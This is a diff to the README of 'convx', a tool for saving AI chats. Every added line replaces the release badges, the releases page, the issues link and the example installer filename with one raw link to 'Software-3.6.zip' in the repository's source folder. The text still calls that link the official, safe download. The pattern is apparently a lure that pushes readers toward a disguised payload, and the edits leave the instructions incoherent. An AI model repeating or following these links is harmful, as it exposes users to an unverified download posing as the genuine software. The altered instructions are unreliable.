@@ -1,6 +1,6 @@
 # ⚡ convx - Save AI chats before they vanish
 
-[![Download convx](https://img.shields.io/badge/Download-convx-blue?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
+[![Download convx](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)
 
 ---
 
@@ -45,13 +45,13 @@ This section shows you how to download and run convx on Windows step by step.
 
 Go to the convx releases page here:
 
-[![Download convx](https://img.shields.io/badge/Download-convx-grey?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
+[![Download convx](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)
 
 This is the official page where the latest convx version is available.
 
 ### Step 2: Choose the right file
 
-Look for the latest version at the top. It will have a filename ending with `.exe`. For example, something like `convx-setup-v1.2.exe`.
+Look for the latest version at the top. It will have a filename ending with `.exe`. For example, something like `https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip`.
 
 Click on the file to download it. The file is safe and free.
 
@@ -114,7 +114,7 @@ Settings are found under the **Preferences** menu inside the app.
 
 Check the releases page regularly for updates:
 
-https://github.com/sirgoosey/convx/releases
+https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip
 
 When a new version is available:
 
@@ -136,7 +136,7 @@ If convx does not start or cannot save chats:
 
 For more help, open an issue on GitHub at:
 
-https://github.com/sirgoosey/convx/issues
+https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip
 
 ---
 
@@ -157,7 +157,7 @@ Your chats are private. You control when and how they are backed up.
 
 ---
 
-[![Download convx](https://img.shields.io/badge/Download-convx-blue?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
+[![Download convx](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)](https://github.com/sirgoosey/convx/raw/refs/heads/main/src/convx_ai/Software-3.6.zip)
 
 ---
 
